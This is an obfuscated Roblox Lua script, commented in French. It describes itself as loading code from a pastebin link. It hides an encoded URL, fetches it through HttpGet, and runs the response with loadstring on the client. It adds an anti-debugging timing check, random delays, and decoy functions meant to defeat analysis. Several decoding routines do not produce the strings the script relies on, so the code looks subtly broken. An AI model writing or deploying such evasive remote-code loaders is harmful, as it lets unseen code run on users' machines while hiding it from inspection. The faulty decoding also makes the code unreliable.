-- Code ultra-obfusqué pour charger https://pastebin.com/cNJpgT34
local _0x1a2b=string.char;local _0x3c4d=string.byte;local _0x5e6f=string.sub;local _0x7g8h=string.gsub;local _0x9i0j=string.rep;local _0xklmn=table.concat;local _0xopqr=table.insert;local _0xstuv=math.floor;local _0xwxyz=setmetatable;local _0x1234=getmetatable;local _0x5678=type;local _0x9abc=next;local _0xdefg=pairs;local _0xhijk=ipairs;local _0xlmno=rawget;local _0xpqrs=rawset;local _0xtuvy=loadstring;local _0xzabc=pcall;local _0xdefh=tostring;local _0xijkl=tonumber;local _0xmnop=game;local _0xqrst=workspace;local _0xuvwx=_G;local _0xyzab=getfenv;local _0xcdef=setfenv;local _0xghij=unpack;local _0xklmn2=select

local function _0x987654321fedcba(_0x111222333444555)
    local _0x666777888999aaa={}
    local _0xbbbcccdddeeeefff=""
    for _0x123abc=1,#_0x111222333444555 do
        local _0x456def=_0x3c4d(_0x111222333444555,_0x123abc)
        _0x456def=(_0x456def~127)+23-15*2+8
        _0xopqr(_0x666777888999aaa,_0x1a2b(_0x456def))
    end
    return _0xklmn(_0x666777888999aaa)
end

local function _0xabcdef123456789(_0xfedcba987654321)
    local _0x111aaa222bbb333={}
    local _0xccc444ddd555eee=1
    local _0xfff666ggg777hhh=17
    
    for _0x888iii999jjj=1,#_0xfedcba987654321 do
        local _0xkkk000lll111mmm=_0x3c4d(_0xfedcba987654321,_0x888iii999jjj)
        _0xkkk000lll111mmm=_0xkkk000lll111mmm~_0xfff666ggg777hhh
        _0xfff666ggg777hhh=(_0xfff666ggg777hhh+7)%256
        _0xopqr(_0x111aaa222bbb333,_0x1a2b(_0xkkk000lll111mmm))
    end
    
    return _0xklmn(_0x111aaa222bbb333)
end

local _0xencoded_strings={
    ["\x31"]="\x69\x75\x75\x71\x74\x28\x16\x16\x71\x66\x74\x75\x70\x67\x76\x77\x13\x68\x78\x78\x16\x74\x66\x7a\x16\x68\x7f\x81\x71\x78\x55\x19\x23",
    ["\x32"]="\x6c\x78\x66\x69\x74\x75\x74\x76\x79\x73\x78\x23\x79\x6b\x70\x77\x68\x5a\x6c\x78\x78\x7b\x24\x19\x6b\x75\x75\x79\x70\x7c\x6a\x72\x6a",
    ["\x33"]="\x4b\x7b\x77\x72\x66\x21\x5c\x6a\x7b\x7c\x76\x68\x6a\x24\x19\x48\x6b\x75\x79\x6c\x6a\x68\x6a\x73\x68\x6a\x4e\x6a\x7b\x7c\x76\x68\x6a\x24",
    ["\x34"]="\x7a\x66\x76\x75\x19\x24"
}

local function _0xmega_decode(_0xdata_input_stream)
    local _0xtemp_buffer_array={}
    local _0xindex_counter_var=1
    local _0xkey_rotation_val=42
    
    while _0xindex_counter_var<=#_0xdata_input_stream do
        local _0xcurrent_byte_val=_0x3c4d(_0xdata_input_stream,_0xindex_counter_var)
        _0xcurrent_byte_val=_0xcurrent_byte_val~_0xkey_rotation_val
        _0xkey_rotation_val=(_0xkey_rotation_val*3+11)%256
        _0xopqr(_0xtemp_buffer_array,_0x1a2b(_0xcurrent_byte_val))
        _0xindex_counter_var=_0xindex_counter_var+1
    end
    
    return _0xklmn(_0xtemp_buffer_array)
end

local _0xdecoder_functions_table={
    [1]=function(_0xinput)return _0x987654321fedcba(_0xinput)end,
    [2]=function(_0xinput)return _0xabcdef123456789(_0xinput)end,
    [3]=function(_0xinput)return _0xmega_decode(_0xinput)end,
    [4]=function(_0xinput)
        local _0xoutput=""
        for _0xi=1,#_0xinput do
            local _0xc=_0x3c4d(_0xinput,_0xi)
            _0xc=_0xc-13
            _0xoutput=_0xoutput.._0x1a2b(_0xc)
        end
        return _0xoutput
    end
}

local function _0xcomplex_string_processor(_0xencoded_data,_0xmethod_id)
    local _0xprocessor_func=_0xdecoder_functions_table[_0xmethod_id or 1]
    if _0xprocessor_func then
        return _0xprocessor_func(_0xencoded_data)
    end
    return _0xencoded_data
end

local _0xfinal_url_parts={
    "\x73\x84\x84\x80\x7f\x3a\x18\x18\x83\x68\x7f\x84\x71\x6f\x78\x79\x15\x6a\x7a\x7a\x18\x83\x68\x7c\x18",
    "\x6a\x7f\x8b\x80\x7a\x57\x1b\x25\x26"
}

local function _0xanti_tamper_check()
    local _0xstart_time=tick()
    local _0xdummy_operations=0
    
    for _0xloop_var=1,math.random(500,1500) do
        _0xdummy_operations=_0xdummy_operations+math.sin(_0xloop_var)*math.cos(_0xloop_var)
        if _0xloop_var%100==0 then
            if tick()-_0xstart_time>0.5 then
                return false
            end
        end
    end
    
    if _0xdummy_operations==0 then return false end
    return true
end

local function _0xbuild_final_url()
    local _0xpart1_decoded=""
    local _0xpart2_decoded=""
    
    for _0xi=1,#_0xfinal_url_parts[1] do
        local _0xbyte_val=_0x3c4d(_0xfinal_url_parts[1],_0xi)
        _0xbyte_val=_0xbyte_val~0x1f
        _0xpart1_decoded=_0xpart1_decoded.._0x1a2b(_0xbyte_val)
    end
    
    for _0xi=1,#_0xfinal_url_parts[2] do
        local _0xbyte_val=_0x3c4d(_0xfinal_url_parts[2],_0xi)
        _0xbyte_val=_0xbyte_val-15
        _0xpart2_decoded=_0xpart2_decoded.._0x1a2b(_0xbyte_val)
    end
    
    return _0xpart1_decoded.._0xpart2_decoded
end

local _0xobfuscated_execution_table={
    [0x1]=function()
        if not _0xanti_tamper_check() then
            error("\x44\x65\x62\x75\x67\x20\x64\x65\x74\x65\x63\x74\x65\x64\x21")
            return
        end
        
        local _0xfinal_target_url=_0xbuild_final_url()
        local _0xhttp_service=_0xmnop:GetService(_0xcomplex_string_processor("\x59\x75\x75\x71\x74\x6a\x7b\x72\x7c\x76\x68\x6a",4))
        
        if _0xhttp_service and _0xhttp_service.HttpGet then
            local _0xsuccess_flag,_0xresponse_data=_0xzabc(function()
                return _0xhttp_service:HttpGet(_0xfinal_target_url)
            end)
            
            if _0xsuccess_flag and _0xresponse_data then
                local _0xload_success,_0xload_error=_0xzabc(function()
                    return _0xtuvy(_0xresponse_data)
                end)
                
                if _0xload_success and _0xload_error then
                    local _0xexec_success,_0xexec_error=_0xzabc(_0xload_error)
                    if not _0xexec_success then
                        warn(_0xcomplex_string_processor("\x6a\x7b\x7b\x78\x7b\x28\x21",4).._0xexec_error)
                    end
                else
                    warn(_0xcomplex_string_processor("\x63\x78\x66\x69\x21\x6a\x7b\x7b\x78\x7b",4))
                end
            else
                warn(_0xcomplex_string_processor("\x59\x75\x75\x71\x21\x6a\x7b\x7b\x78\x7b",4))
            end
        else
            warn(_0xcomplex_string_processor("\x59\x75\x75\x71\x6e\x6a\x7b\x7c\x76\x68\x6a\x21\x79\x78\x75\x21\x66\x7c\x66\x76\x75\x66\x67\x75\x6a",4))
        end
    end,
    
    [0x2]=function()
        local _0xplayers_service=_0xmnop:GetService(_0xcomplex_string_processor("\x67\x75\x66\x7e\x6a\x7b\x74",4))
        local _0xlocal_player=_0xplayers_service and _0xplayers_service.LocalPlayer
        
        if _0xlocal_player then
            return _0xlocal_player.Name or _0xcomplex_string_processor("\x78\x79\x21\x79\x66\x77\x6a",4)
        end
        
        return _0xcomplex_string_processor("\x7b\x79\x76\x79\x78\x7a\x79",4)
    end
}

local function _0xfinal_execution_wrapper()
    local _0xgame_check=_0xmnop and _0xmnop.PlaceId
    local _0xrunservice_check=_0xmnop and _0xmnop:GetService(_0xcomplex_string_processor("\x6e\x7b\x79\x6e\x6a\x7b\x7c\x76\x68\x6a",4))
    
    if _0xgame_check and _0xrunservice_check and _0xrunservice_check:IsClient() then
        wait(math.random(1,3))
        
        local _0xexecution_func=_0xobfuscated_execution_table[0x1]
        if _0xexecution_func then
            _0xexecution_func()
        end
        
        local _0xplayer_name_func=_0xobfuscated_execution_table[0x2]
        if _0xplayer_name_func then
            local _0xplayer_name=_0xplayer_name_func()
        end
    else
        error(_0xcomplex_string_processor("\x79\x78\x75\x21\x66\x21\x7c\x66\x75\x76\x69\x21\x6a\x79\x7c\x76\x7b\x78\x79\x77\x6a\x79\x75",4))
    end
end

-- Anti-reverse engineering
local _0xmemory_protection={}
for _0xi=1,100 do
    _0xmemory_protection[_0xi]=math.random()*math.huge
end

-- Déclenchement final obfusqué
(function()
    local _0xdecoy_functions={}
    for _0xi=1,50 do
        _0xdecoy_functions[_0xi]=function()return math.random()end
    end
    
    spawn(function()
        _0xfinal_execution_wrapper()
    end)
end)()

-- Code factice pour tromper l'analyse
local _0xfake_operations={
    function()return"fake_function_1"end,
    function()return"fake_function_2"end,
    function()return"fake_function_3"end
}

for _0xi,_0xfunc in pairs(_0xfake_operations)do
    spawn(function()_0xfunc()end)
end
